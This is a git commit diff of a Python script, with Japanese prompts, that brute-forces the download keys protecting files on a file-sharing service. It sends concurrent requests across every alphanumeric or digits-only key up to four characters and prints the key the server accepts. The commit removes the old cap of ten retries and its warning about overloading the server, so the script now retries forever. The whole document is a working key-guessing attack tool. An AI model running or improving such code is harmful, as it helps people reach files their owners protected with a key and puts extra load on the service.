194cbae2d465389dacc0d2d1163582cbbfee5bf3
つくも <92912896+Thukumo@users.noreply.github.com>
2024-08-28 09:12:44 +0900

    なんかいい感じに

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import aiohttp, asyncio
 from iter_func import iter_func
 from tqdm import tqdm
 from time import sleep
-
+from random import randint
 async def check_dlkey(url, dlkey, is_zip, pbar):
     _, _, server, file = url.split("/")
     try:
@@ -18,7 +18,7 @@ async def check_dlkey(url, dlkey, is_zip, pbar):
                 if response.status == 200:
                     json = await response.json()
                     if json["status"] == 0:
-                        pbar.write(f"key(?) = {dlkey}")
+                        pbar.write(f"key = {dlkey}")
                         return [0, dlkey]
                     elif json["status"] == 1:
                         return [1, dlkey]
@@ -34,8 +34,6 @@ async def check_dlkey(url, dlkey, is_zip, pbar):
         return [2, dlkey]
 
 async def main():
-    global retring_key
-    testing_key = None
     for i in range(1 if begin_at== None else len(begin_at), 5):
         print(f"探索開始: {i}文字")
         ite = iter_func(lambda x: x, "?"*i, base_str, begin_at=(None if begin_at == None else begin_at if len(begin_at) == i else None))
@@ -50,14 +48,11 @@ async def main():
                     for r in res:
                         pbar.update(1)
                         if r[0] == 0:
-                            return
+                            return True
                         elif r[0] in [2 , 3]:
-                            retring_key = r[1]
                             if r[0] == 3: sleep(0.05)
                             if (res := await check_dlkey(url, r[1], is_zip, pbar))[0] in [2, 3]: raise RuntimeError(f"2回連続で失敗しました 試行していたキー: {r[1]}")
-                            elif res == 0:
-                                retring_key = None
-                                return
+                            elif res == 0: return True
                 except StopIteration:
                     if len(tmpl) != 0:
                         tasks = [check_dlkey(url, s, is_zip, pbar) for s in tmpl]
@@ -65,15 +60,13 @@ async def main():
                         for r in res:
                             pbar.update(1)
                             if r[0] == 0:
-                                return
+                                return True
                             elif r[0] in [2 , 3]:
-                                retring_key = r[1]
                                 if r[0] == 3: sleep(0.05)
                                 if (res := await check_dlkey(url, r[1], is_zip, pbar))[0] in [2, 3]: raise RuntimeError(f"2回連続で失敗しました 試行していたキー: {r[1]}")
-                                elif res == 0:
-                                    retring_key = None
-                                    return
+                                elif res == 0: return True
                     break
+    return False
 
 url = input("URLを入力してください(短縮URLはエラー吐きます): ")
 is_zip = input("zip(まとめてダウンロード)?(y/n): ").lower() == "y"
@@ -87,15 +80,21 @@ base_str += base_str.upper() + "0123456789"
 if input("数字のみ探索しますか?\n英字を探索しない代わりに、探索にかかる時間が約1/1478になります。(y/n)").lower() == "y": base_str = "0123456789"
 begin_at = input("前回エラー終了した場合は、\nここで前回最後に試行していたキーを入力してください。")
 if len(begin_at)==0: begin_at=None
-for n in range(10):
+#for n in range(10):
+roop = True
+while roop:
     roop = False
     try:
-        asyncio.run(main())
-        break
+        result = asyncio.run(main())
     except RuntimeError as e:
+        roop = True
         print(e)
+        sleep(randint(1, 10)/10) #0.1~1秒待機
         print(f'{ str(e).split(" ")[2] }から再試行を開始します...')
         begin_at = str(e).split(" ")[2]
+        """
         if n == 9:
             print("10回連続で失敗しました。終了します。\nサーバに過負荷がかかっている可能性があります。\n同時実行数を下げることを推奨します。")
             break
+        """
+if not result: print("全てのキーを試行しましたが、正しいキーが見つかりませんでした。")
